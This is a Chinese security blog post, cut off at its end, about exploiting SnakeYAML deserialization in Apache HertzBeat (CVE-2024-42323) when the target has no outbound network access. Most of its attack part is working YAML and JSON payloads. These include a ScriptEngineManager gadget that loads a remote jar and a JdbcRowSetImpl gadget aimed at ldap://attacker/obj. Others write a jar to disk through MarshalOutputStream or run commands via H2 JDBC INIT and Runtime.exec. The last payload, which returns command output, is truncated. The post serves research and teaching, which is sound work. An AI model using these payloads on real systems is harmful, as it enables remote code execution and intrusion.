---
title: Java利用无外网（上）：从HertzBeat聊聊SnakeYAML反序列化
url: https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html
source: 离别歌
date: 2025-04-11
fetch_date: 2025-10-06T22:02:42.662129
---

# Java利用无外网（上）：从HertzBeat聊聊SnakeYAML反序列化

* [主页](/)
* 返回

Back to top
Share post

# 从HertzBeat聊聊SnakeYAML反序列化

phithon

Apr 10, 2025, 10:00 AM

阅读：15083

[网络安全](/sort/PENETRATION)

[java安全](/tag/java%E5%AE%89%E5%85%A8),
[ctf](/tag/ctf)

上周日联合@Ar3h 师傅一起，在【[代码审计知识星球](https://govuln.com)】里发布了一个Springboot的小挑战：<https://t.zsxq.com/tSBBZ>，这个小挑战的核心目标是在无法连接外网的情况下，如何利用PSQL JDBC注入漏洞。我会分两篇文章来讲讲所谓的“不出网利用”，第一篇文章会介绍最近遇到的一个实际案例，也就是Vulhub里的[Apache Hertzbeat的后台代码执行漏洞（CVE-2024-42323）](https://github.com/vulhub/vulhub/tree/master/hertzbeat/CVE-2024-42323)；第二篇文章《[Java利用无外网（下）：ClassPathXmlApplicationContext的不出网利用](https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html)》，来讲讲星球里这个小挑战的预期和非预期答案。

## [SnakeYAML反序列化历史](#snakeyaml)

Apache HertzBeat是一个开源的实时监控告警工具，支持对操作系统、中间件、数据库等多种对象进行监控，并提供 Web 界面进行管理。

HertzBeat在解析YAML的时候使用了SnakeYAML，而SnakeYAML在满足如下两个条件时，将会存在反序列化漏洞（CVE-2022-1471）：

* 版本<2.0
* 初始化Yaml对象时没有使用`SafeConstructor`

互联网上已经有很多关于SnakeYAML反序列化原理和利用的文章了，大部分的Payload都是基于`ScriptEngineManager`：

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/"]]]]
```

我是一个比较喜欢考古的人，我翻了一下这个Payload的来龙去脉。它最早出现或者说被公开是在Moritz Bechler 2017年发布的[marshalsec](https://github.com/mbechler/marshalsec)项目以及[Paper](https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf)中，marshalsec相信大家不陌生，几乎是和ysoserial并肩的Java反序列化开山鼻祖之作。

Moritz Bechler在paper中提出，使用JDK自带的ScriptEngineManager类可以加载来自于远程服务器的Jar包，进而通过这个方式执行任意字节码。他同时也提到了另一个使用JNDI来进行RCE的payload，也是很熟悉的类了：

```
!! com.sun.rowset.JdbcRowSetImpl
   dataSourceName: ldap://attacker/obj
   autoCommit: true
```

对于2017年的安全研究者来说，marshalsec提出的这些漏洞以及Gadgets让所有人眼前一亮，相比于ysoserial仅关注Java默认的反序列化漏洞而言，marshalsec填补了json、xml、yaml、hessian等第三方反序列化领域的空缺。

这时候我就有点好奇了，既然2017年就有人提出了SnakeYAML的反序列化漏洞，为什么CVE编号是CVE-2022-1471？

这就不得不说到，SnakeYAML的作者Andrey Somov一直拒绝认为这是一个安全漏洞，直到2022年有好事之徒为这个反序列化漏洞申请了一个CVE编号（CVE-2022-1471），于是正反双方开始在[这个issue](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in)里进行辩论。

Andrey Somov非常恼火于有太多“低质量”安全工具，一旦发现有项目依赖SnakeYAML就会报反序列化漏洞，而SnakeYAML当时没有针对这个问题发布任何修复建议或补丁。

他认为，100%的SnakeYAML使用场景下，解析的YAML都来自于可信的地方。况且SnakeYAML在十年前就提供了`SafeConstructor()`这个类来限制反序列化白名单以外的对象，所以这并不是一个安全漏洞，用户不需要“修复”漏洞。

不过，最后Andrey Somov还是屈服了，为了避免再被安全工具骚扰，他在2.0中“修复”了这个漏洞，修复方法是遵从“Secure by Default”原则——开发者不再需要手工调用`SafeConstructor()`，让其成为默认选项。

## [寻找SnakeYAML利用链](#snakeyaml_1)

回到漏洞本身，我们其实可以发现，SnakeYAML反序列化的利用，实际上又是一个找Gadget的游戏。marshalsec作者在paper中提到的两个利用链都需要连接外网，第一个需要从http或者ftp地址下载jar包，第二个需要连接恶意JNDI服务器，我们可以找找看是否有更好的利用链。

寻找SnakeYAML Gadget的方法，我并不认为需要单独跑什么工具来从零挖掘，只需看看现在公开的漏洞中，是否有合适的类可以利用。SnakeYAML的利用链和Fastjson其实有点类似，我画了一个表格来描述他们二者的相似与不同点：

|  | Fastjson | SnakeYAML |
| --- | --- | --- |
| setter | ✅ | ✅ |
| getter | ✅ | ❌ |
| constructor | ⭕（有条件） | ✅ |

SnakeYAML的利用链没有办法调用getter，所以可以看看fastjson中常用的那些不需要getter的利用链。

**com.sun.org.apache.bcel.internal.util.ClassLoader**：看似不需要使用`$ref`，但实际上调用JSONObject.toString()的时候触发了getConnection()才能执行字节码，所以实际上这个利用链是需要getter的。另外，bcel对Java版本要求比较高，参考我在《[BCEL ClassLoader去哪了](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)》这篇文章中的分析，8u251以后就不再有这个类。

**com.sun.rowset.JdbcRowSetImpl**：经典payload，但是需要利用JNDI注入，对网络和Java版本都有一定要求。

**com.mchange.v2.c3p0.WrapperConnectionPoolDataSource**：这个利用链实际上是marshalsec中先为SnakeYAML提出的，后来国内的安全研究者将其应用在了fastjson中。它的优点是可以直接执行字节码，不需要写文件和连接外网，缺点是c3p0这个第三方依赖用的并不多。

**sun.rmi.server.MarshalOutputStream**：@rmb122在《[fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记](https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/)》这篇文章里发现的fastjson写文件利用链。他在文中提到：

> 这里分享一条我找到的不需要三方库的链, 注意虽然不需要三方库, 但只能在 openjdk >= 11 下利用, 因为只有这些版本没去掉符号信息. fastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用的, 所以可以多利用一些内部类, 但是 openjdk 8, 包括 oracle jdk 都是不带这些信息的, 导致无法反序列化, 自然也就无法利用. 所以相对比较鸡肋, 仅供学习。

对于有参构造函数来说，json的特性导致fastjson需要找到每个参数的名称才能进行初始化。在Java 8下，内部类没有符号信息，函数参数也就没有名称，导致这个利用链变得鸡肋。

但SnakeYAML对于构造函数并没有特殊要求，我们可以通过type + 参数列表的方式调用任意构造函数，这样让这个利用链能够在不同Java版本中生效。

```
!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["success.jar"],false],!!java.util.zip.Inflater { input: !!binary eJxLLE5JTCkGAAh5AnE= },1048576]]
```

我们可以通过这个利用链写入Jar包，然后再利用前面说到的`javax.script.ScriptEngineManager`加载本地的Jar包，完成不出网的利用，这是第一个相对比较完美的利用链：

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["file:///success.jar"]]]]
```

## [利用JDBC注入执行命令](#jdbc)

如果想要利用一个数据包完成命令执行，是否有可以利用的Gadget呢？

既然SnakeYAML可以调用构造函数，其实我最开始想到的是**org.springframework.context.support.ClassPathXmlApplicationContext**，使用ClassPathXmlApplicationContext来执行任意命令：

```
!!org.springframework.context.support.ClassPathXmlApplicationContext [ "http://example.com/spring.xml" ]
```

当然，ClassPathXmlApplicationContext也需要加载远程文件，如果无法连外网，我们也需要通过前面写文件再读取的方式来利用。

《[Java安全攻防之老版本 Fastjson 的一些不出网利用](https://www.anquanke.com/post/id/283079)》这篇文章中曾经提到fastjson可以借助H2的JDBC注入来利用：

```
[
    {
        "@type": "java.lang.Class",
        "val": "org.h2.jdbcx.JdbcDataSource"
    },
    {
        "@type": "org.h2.jdbcx.JdbcDataSource",
        "url": "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"open -a calculator.app\")\\; }'\\;CALL EXEC ()\\;"
    },
    {
        "$ref": "$[1].connection"
    }
]
```

这个POC初始化**org.h2.jdbcx.JdbcDataSource**后，再利用`$[1].connection`来调用`getConnection()`，触发JDBC注入。

SnakeYAML虽然并不支持调用getter，但我们也没必要把思路禁锢在`getConnection()`。跟进`getConnection()`后，我发现其实际上是**org.h2.jdbc.JdbcConnection**这个类的一个工厂函数：

```
@Override
public Connection getConnection() throws SQLException {
    debugCodeCall("getConnection");
    return new JdbcConnection(url, null, userName, StringUtils.cloneCharArray(passwordChars), false);
}
```

那么就简单了，直接利用SnakeYAML调用JdbcConnection的构造函数即可：

```
!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"calc.exe\")\\; }$$\\;CALL EXEC ()\\;", {}, "a", "b", false ]
```

[![image.png](/media/attachment/2025/04/10/b4ac58d4-0e7c-4471-a519-78bc923cbf89.7a9e17336333.png)](/media/attachment/2025/04/10/b4ac58d4-0e7c-4471-a519-78bc923cbf89.png)

## [优化YAML Payload，减少转义](#yaml-payload)

我们来观察一下这个利用h2编写的POC，这里其实调用了**org.h2.jdbc.JdbcConnection**的构造函数，并传入了5个参数，他们分别是：

* JDBC的完整URL
* JDBC的属性列表，类型是Java中的`Hashtable`，对应到YAML中就是一个map
* 连接用户名
* 连接密码
* 是否禁止创建数据库（forbidCreation）

这里有一个值得关注的参数，forbidCreation，用于禁止创建新的数据库。还记得H2 Database Web Console的未授权访问漏洞导致的JDBC注入（[CVE-2022-23221](https://github.com/vulhub/vulhub/tree/master/h2database/h2-console-unacc)）吗？

这个漏洞的修复方法之一就是将forbidCreation默认值设置为true，禁止创建数据库。

当forbidCreation等于true时，必须在目标服务器上找到一个已经存在的h2数据库文件进行连接才能执行后续JDBC注入操作，内存数据库`jdbc:h2:mem`也无法使用。

但幸运的是，JdbcConnection的构造函数支持让攻击者直接控制所有参数，所以直接将其设置为false即可。

另外，我们观察到，第一个参数URL中，由于要在INIT中执行多个SQL语句，所以我使用了反斜线对分号进行转义`\;`，但又由于整个URL位于YAML中的字符串中，所以还要再次对反斜线进行转义`\\;`，整个POC的可读性大大降低。

> 网上有一些文章说JDBC的INIT中不支持执行多个SQL语句，其实原因就是没有转义分号导致的，实际上这里并没有限制。

其实JdbcConnection构造函数的第二个参数是属性表，我们完全可以将INIT这种属性放到这里面，以减少URL参数中的转义，然后将YAML修改成我们更熟悉的样式：

```
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    drop alias if exists exec;
    CREATE ALIAS EXEC AS $$void exec() throws Exception {Runtime.getRuntime().exec("calc.exe");}$$;
    CALL EXEC ();
- a
- b
- false
```

[![image.png](/media/attachment/2025/04/10/1c4c466d-6be0-433f-b059-d5ee65bd4c09.5e0d5f5f0728.png)](/media/attachment/2025/04/10/1c4c466d-6be0-433f-b059-d5ee65bd4c09.png)

## [利用Spring方法制造回显](#spring)

Apache Hertzbeat是基于Spring开发的应用，我们可以继续改造Payload，让其使用`org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getResponse()`拿到response，写入命令执行的结果：

```
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    DROP ALIAS IF EXISTS EXEC;
    CREATE ALIAS EXEC AS $$void exec() throws Exception {org.springframework.util.StreamUtils.copy(java.lang....